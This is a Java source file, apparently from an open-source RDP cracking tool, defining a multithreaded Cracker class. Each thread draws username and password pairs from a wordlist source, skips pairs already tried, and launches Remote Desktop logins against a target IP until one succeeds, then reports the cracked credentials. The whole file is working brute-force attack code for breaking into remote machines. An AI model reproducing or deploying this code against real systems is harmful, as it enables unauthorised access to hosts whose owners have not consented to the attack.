package com.redpois0n.rdp;

import com.lixia.rdp.RdesktopSwing;
import com.lixia.rdp.RdpJPanel;

public class Cracker implements Runnable {

	private final short threadID = Main.getThreadID();

	private int tested = 0;

	private boolean running = true;

	public static String ip = ""; // TODO: Make private non static
	private String username;
	private String password;

	private RdpJPanel panel;
	private RdesktopSwing swing;

	public Cracker() {
		Frame.instance.addThread(threadID);
	}

	@Override
	public void run() {
		try {
			while (running) {
				username = Main.getUsername();
				password = Main.getPassword();

				while (Main.isTried(username, password)) {
					username = Main.getUsername();
					password = Main.getPassword();
				}

				Frame.instance.status(threadID, "Cracking...");
				Frame.instance.setCombination(threadID, username, password, tested++);
				String[] args = new String[] { "-u", username, "-p", password, ip };
				RdesktopSwing.init(args, this);

				Main.tried(username, password);

				if (Main.delay != -1L) {
					Frame.instance.status(threadID, "Delaying...");
					Thread.sleep(Main.delay);
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void status(String status) {
		Frame.instance.status(threadID, status);
	}

	public void loggedOn() {
		status("Successfully cracked " + ip + " with username " + username + " with password " + password);
		Main.sleep(2500L);
		panel.disconnect();

		if (Frame.instance.shouldStopOnSuccess()) {
			stop();
		}
	}
	
	public void stop() {
		running = false;
		Frame.instance.removeThread(threadID);
	}

	public String getIp() {
		return ip;
	}

	public void setIp(String ip) {
		this.ip = ip;
	}

	public String getUsername() {
		return username;
	}

	public void setUsername(String username) {
		this.username = username;
	}

	public String getPassword() {
		return password;
	}

	public void setPassword(String password) {
		this.password = password;
	}

	public RdpJPanel getPanel() {
		return panel;
	}

	public void setPanel(RdpJPanel panel) {
		this.panel = panel;
	}

	public RdesktopSwing getSwing() {
		return swing;
	}

	public void setSwing(RdesktopSwing swing) {
		this.swing = swing;
	}

	public short getThreadID() {
		return threadID;
	}

	public void setRunning(boolean running) {
		this.running = running;
	}

	public boolean isRunning() {
		return running;
	}

}
